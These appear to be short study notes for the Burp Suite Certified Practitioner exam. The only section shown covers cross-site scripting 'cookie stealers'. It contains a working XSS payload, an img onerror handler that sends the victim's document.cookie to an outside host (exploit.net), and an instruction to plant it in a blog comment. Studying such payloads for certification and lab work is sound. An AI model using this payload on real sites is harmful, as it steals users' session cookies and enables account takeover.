# Burp-Suite-Certified-Practitioner-Exam-Study
Burp Suite Certified Practitioner Exam Study Notes

## Cross Site Scripting

### Cookie Stealers

** Place payload in blog post comment section for victim to visit and send cookie.
```
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```
